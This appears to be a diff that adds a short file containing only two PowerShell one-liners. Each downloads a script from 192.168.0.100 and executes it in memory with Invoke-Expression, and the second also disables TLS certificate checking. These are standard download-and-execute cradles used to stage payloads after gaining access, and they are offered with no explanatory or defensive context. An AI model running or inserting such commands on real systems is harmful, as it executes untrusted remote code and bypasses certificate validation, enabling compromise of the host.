@@ -1,0 +1,4 @@
+iex(New-Object Net.WebClient).DownloadString('http://192.168.0.100/index.html')
+
+
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.WebClient).DownloadString('https://192.168.0.100/index.html')
